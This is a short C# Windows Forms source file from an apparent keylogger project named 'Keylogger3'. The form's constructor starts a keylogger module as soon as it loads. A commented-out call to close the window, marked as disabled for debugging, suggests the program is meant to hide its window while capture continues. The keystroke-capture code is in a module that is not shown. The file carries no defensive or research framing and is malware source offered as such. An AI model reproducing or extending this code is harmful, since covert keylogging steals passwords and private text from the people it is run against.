using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Modules.Keylogger;
using Modules;

namespace Keylogger3
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Keylogger.StartKeylogger();
        }
        private void Form1_Load(object sender, System.EventArgs e)
        {
            //comment below to debug 
            //this.Close();
        }
    }
}
